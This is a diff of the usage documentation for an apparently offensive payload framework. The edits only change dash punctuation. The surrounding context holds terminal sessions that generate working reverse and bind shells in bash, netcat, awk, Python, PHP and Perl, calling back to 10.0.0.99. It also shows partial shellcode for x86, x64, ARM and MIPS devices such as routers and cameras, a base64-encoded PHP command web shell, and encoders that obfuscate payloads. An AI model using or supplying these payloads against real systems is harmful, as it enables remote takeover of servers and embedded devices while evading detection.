@@ -48,14 +48,14 @@ Binary shellcode payloads generate position-independent ELF-ready shellcode for 
 
 ---
 
-### x86 — Intel 32-bit
+### x86  -  Intel 32-bit
 
 | Module | Path | Description |
 |--------|------|-------------|
 | `bind_tcp` | `payloads/x86/bind_tcp` | Bind TCP shell on target port (x86 Linux) |
 | `reverse_tcp` | `payloads/x86/reverse_tcp` | Reverse TCP shell to attacker (x86 Linux) |
 
-**Terminal session — x86 reverse_tcp:**
+**Terminal session  -  x86 reverse_tcp:**
 
 ```text
 exf > use payloads/x86/reverse_tcp
@@ -98,7 +98,7 @@ buf += b"\x80"
 # Then inject buf into target process
 ```
 
-**Terminal session — x86 bind_tcp:**
+**Terminal session  -  x86 bind_tcp:**
 
 ```text
 exf > use payloads/x86/bind_tcp
@@ -126,14 +126,14 @@ unsigned char buf[] =
 
 ---
 
-### x64 — Intel 64-bit
+### x64  -  Intel 64-bit
 
 | Module | Path | Description |
 |--------|------|-------------|
 | `bind_tcp` | `payloads/x64/bind_tcp` | Bind TCP shell (x64 Linux) |
 | `reverse_tcp` | `payloads/x64/reverse_tcp` | Reverse TCP shell (x64 Linux) |
 
-**Terminal session — x64 reverse_tcp:**
+**Terminal session  -  x64 reverse_tcp:**
 
 ```text
 exf > use payloads/x64/reverse_tcp
@@ -162,14 +162,14 @@ buf += b"\x6a\x3b\x58\x0f\x05"
 
 ---
 
-### armle — ARM little-endian
+### armle  -  ARM little-endian
 
 | Module | Path | Description |
 |--------|------|-------------|
-| `bind_tcp` | `payloads/armle/bind_tcp` | Bind TCP shell (ARM LE — routers, cameras, IoT) |
+| `bind_tcp` | `payloads/armle/bind_tcp` | Bind TCP shell (ARM LE  -  routers, cameras, IoT) |
 | `reverse_tcp` | `payloads/armle/reverse_tcp` | Reverse TCP shell (ARM LE) |
 
-**Terminal session — armle reverse_tcp:**
+**Terminal session  -  armle reverse_tcp:**
 
 ```text
 exf > use payloads/armle/reverse_tcp
@@ -199,14 +199,14 @@ exf (ARM LE Reverse TCP Shell) > run
 
 ---
 
-### mipsbe — MIPS big-endian
+### mipsbe  -  MIPS big-endian
 
 | Module | Path | Description |
 |--------|------|-------------|
-| `bind_tcp` | `payloads/mipsbe/bind_tcp` | Bind TCP shell (MIPS BE — Cisco, Juniper, D-Link) |
+| `bind_tcp` | `payloads/mipsbe/bind_tcp` | Bind TCP shell (MIPS BE  -  Cisco, Juniper, D-Link) |
 | `reverse_tcp` | `payloads/mipsbe/reverse_tcp` | Reverse TCP shell (MIPS BE) |
 
-**Terminal session — mipsbe reverse_tcp:**
+**Terminal session  -  mipsbe reverse_tcp:**
 
 ```text
 exf > use payloads/mipsbe/reverse_tcp
@@ -232,14 +232,14 @@ buf += b"\x24\x0a\x11\x5c\x24\x09\x11\x5c"
 
 ---
 
-### mipsle — MIPS little-endian
+### mipsle  -  MIPS little-endian
 
 | Module | Path | Description |
 |--------|------|-------------|
-| `bind_tcp` | `payloads/mipsle/bind_tcp` | Bind TCP shell (MIPS LE — TP-Link, Netgear, Zyxel) |
+| `bind_tcp` | `payloads/mipsle/bind_tcp` | Bind TCP shell (MIPS LE  -  TP-Link, Netgear, Zyxel) |
 | `reverse_tcp` | `payloads/mipsle/reverse_tcp` | Reverse TCP shell (MIPS LE) |
 
-**Terminal session — mipsle bind_tcp:**
+**Terminal session  -  mipsle bind_tcp:**
 
 ```text
 exf > use payloads/mipsle/bind_tcp
@@ -266,7 +266,7 @@ buf = b"\xfd\xff\x0f\x24\x27\x78\xe0\x01\xff\xff\xe4\x21"
 
 ## Command-line / script payloads
 
-`payloads/cmd/` contains 14 modules for shell, scripting language, and utility-based payloads that inject via command injection vulnerabilities. No shellcode compilation needed — payloads run directly on the target's existing interpreter.
+`payloads/cmd/` contains 14 modules for shell, scripting language, and utility-based payloads that inject via command injection vulnerabilities. No shellcode compilation needed  -  payloads run directly on the target's existing interpreter.
 
 | Module | Path | Description |
 |--------|------|-------------|
@@ -294,7 +294,7 @@ buf = b"\xfd\xff\x0f\x24\x27\x78\xe0\x01\xff\xff\xe4\x21"
 | `port` | `OptPort` | Yes (bind) | `4444` | 1-65535 | Bind port on target |
 | `encode` | `OptBool` | No | `False` | `true/false` | Base64-encode the command (for injection via HTTP) |
 
-**Terminal session — bash_reverse_tcp:**
+**Terminal session  -  bash_reverse_tcp:**
 
 ```text
 exf > use payloads/cmd/bash_reverse_tcp
@@ -315,7 +315,7 @@ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.99%2F4444%200%3E%261
 [+] Start listener: nc -lnvp 4444
 ```
 
-**Terminal session — netcat_reverse_tcp:**
+**Terminal session  -  netcat_reverse_tcp:**
 
 ```text
 exf > use payloads/cmd/netcat_reverse_tcp
@@ -334,7 +334,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.99 4445 > /tm
 [+] Start listener: nc -lnvp 4445
 ```
 
-**Terminal session — awk_reverse_tcp:**
+**Terminal session  -  awk_reverse_tcp:**
 
 ```text
 exf > use payloads/cmd/awk_reverse_tcp
@@ -350,7 +350,7 @@ awk 'BEGIN{s="/inet/tcp/0/10.0.0.99/4444";while(1){do{printf "shell>" |& s;s |& 
 [+] Notes: Works on BusyBox awk (embedded routers/cameras). No /bin/sh dependency.
 ```
 
-**Terminal session — python_reverse_tcp (cmd/):**
+**Terminal session  -  python_reverse_tcp (cmd/):**
 
 ```text
 exf > use payloads/cmd/python_reverse_tcp
@@ -367,7 +367,7 @@ python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.99'
 python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9...'))"
 ```
 
-**Terminal session — awk_bind_tcp:**
+**Terminal session  -  awk_bind_tcp:**
 
 ```text
 exf > use payloads/cmd/awk_bind_tcp
@@ -394,7 +394,7 @@ awk 'BEGIN{s="/inet/tcp/7777/0/0";while(1){do{s |& getline c;print "$ " |& s;whi
 | `reverse_tcp` | `payloads/python/reverse_tcp` | Python 3 reverse TCP shell |
 | `reverse_udp` | `payloads/python/reverse_udp` | Python 3 reverse UDP shell |
 
-**Terminal session — python/reverse_tcp:**
+**Terminal session  -  python/reverse_tcp:**
 
 ```text
 exf > use payloads/python/reverse_tcp
@@ -425,7 +425,7 @@ if __name__ == '__main__':
 [+] Start listener: nc -lnvp 4444 or msfconsole -x "use multi/handler; set payload python/shell_reverse_tcp..."
 ```
 
-**Terminal session — python/bind_udp:**
+**Terminal session  -  python/bind_udp:**
 
 ```text
 exf > use payloads/python/bind_udp
@@ -449,7 +449,7 @@ if __name__ == '__main__':
     udp_shell(5555)
 
 [+] Use: nc -u 192.168.1.100 5555
-[+] Note: UDP shells are stateless — ideal for firewalls that block TCP
+[+] Note: UDP shells are stateless  -  ideal for firewalls that block TCP
 ```
 
 ---
@@ -461,7 +461,7 @@ if __name__ == '__main__':
 | `bind_tcp` | `payloads/php/bind_tcp` | PHP bind TCP shell (web server context) |
 | `reverse_tcp` | `payloads/php/reverse_tcp` | PHP reverse TCP shell (web server context) |
 
-**Terminal session — php/reverse_tcp:**
+**Terminal session  -  php/reverse_tcp:**
 
 ```text
 exf > use payloads/php/reverse_tcp
@@ -488,7 +488,7 @@ proc_close($proc);
 <?php eval(base64_decode('JHNvY2sgPSBmc29ja29wZW4oIjEwLjAuMC45OSIsIDQ0NDQpO...')); ?>
 ```
 
-**Terminal session — php/bind_tcp:**
+**Terminal session  -  php/bind_tcp:**
 
 ```text
 exf > use payloads/php/bind_tcp
@@ -518,7 +518,7 @@ while ($cmd = fgets($client)) {
 | `bind_tcp` | `payloads/perl/bind_tcp` | Perl bind TCP shell |
 | `reverse_tcp` | `payloads/perl/reverse_tcp` | Perl reverse TCP shell |
 
-**Terminal session — perl/reverse_tcp:**
+**Terminal session  -  perl/reverse_tcp:**
 
 ```text
 exf > use payloads/perl/reverse_tcp
@@ -569,7 +569,7 @@ Encoders transform payload bytes or script content for obfuscation, transport en
 
 ---
 
-### Terminal session — encoders/python/base64
+### Terminal session  -  encoders/python/base64
 
 ```text
 exf > use encoders/python/base64
@@ -586,7 +586,7 @@ exec(__import__('base64').b64decode(b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c2
 [+] Or: python3 -c "exec(__import__('base64').b64decode(b'aW1wb3J0...'))"
 ```
 
-### Terminal session — encoders/python/base64 with 2 iterations (double encoding)
+### Terminal session  -  encoders/python/base64 with 2 iterations (double encoding)
 
 ```text
 exf (Python Base64 Encoder) > set iterations 2
@@ -599,7 +599,7 @@ exf (Python Base64 Encoder) > run
 exec(__import__('base64').b64decode(__import__('base64').b64decode(b'WlhaaWIzUjBYMkJoWTJ0bGJpZ3hJRUpzWVhraVlYZHo...').decode()).decode())
 ```
 
-### Terminal session — encoders/php/base64
+### Terminal session  -  encoders/php/base64
 
 ```text
 exf > use encoders/php/base64
@@ -616,7 +616,7 @@ exf (PHP Base64 Encoder) > run
 echo 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' | base64 -d | php
 ```
 
-### Terminal session — encoders/perl/hex
+### Terminal session  -  encoders/perl/hex
 
 ```text
 exf > use encoders/perl/hex
@@ -630,7 +630,7 @@ exf (Perl Hex Encoder) > run
 perl -e 'eval(pack("H*","75736520536f636b65743b..."
 ```
 
-### Terminal session — encoders/python/url
+### Terminal session  -  encoders/python/url
 
 ```text
 exf > use encoders/python/url
@@ -645,7 +645,7 @@ import%20os%3Bos.system%28%27id%27%29
 exec(__import__('urllib.parse',fromlist=['unquote']).unquote('import%20os%3Bos.system%28%27id%27%29'))
 ```
 
-### Terminal session — encoders/php/rot13
+### Terminal session  -  encoders/php/rot13
 
 ```text
 exf > use encoders/php/rot13
